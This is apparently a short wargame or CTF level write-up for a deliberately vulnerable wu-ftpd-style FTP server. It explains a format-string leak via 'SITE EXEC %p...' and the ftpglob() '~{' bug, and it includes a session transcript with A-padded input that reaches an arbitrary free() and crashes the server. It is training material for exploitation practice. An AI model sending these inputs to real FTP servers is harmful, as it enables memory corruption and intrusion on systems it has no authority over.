Water Dragon

This level brings back the fun of the old wu-ftpd daemon.

To info leak heap/stack addresses, use 

SITE EXEC %p%p%p%p.%p%p%p%p.%p%p%p%p.%p%p%p%p.

(Just for kicks, I made 'n' not inputable into SITE EXEC commands :P)

To pass an arbitrary address to free(), do

```
úsame anónimo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
200 Login OK
úsame anónimo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
200 Login OK
CWD ~{
331 Unable to change working directory to "~{"
LOGIN anonymous B
200 Successfully logged in!
CWD ~{
Segmentation fault (core dumped)
```

and it will die on free() trying to access a bunch of A's.

To tl;dr the ftpglob() vulnerability, it's meant to return NULL if there's no results, but ~{ makes it return

char \*\*results = [ NULL ]

and the code assumes that if results is !NULL, then results contains at least one pointer, and then

blkfree(&results[1]), which does free(old data on heap)

The úsame anónimo  bit is critical, as that accepts [\x01-\x1f\x21-\xff] as input and strdup's it

---

Any malloc implementation should work if you can pass it an arbitrary use supplied pointer for free and
do something interesting with it. 
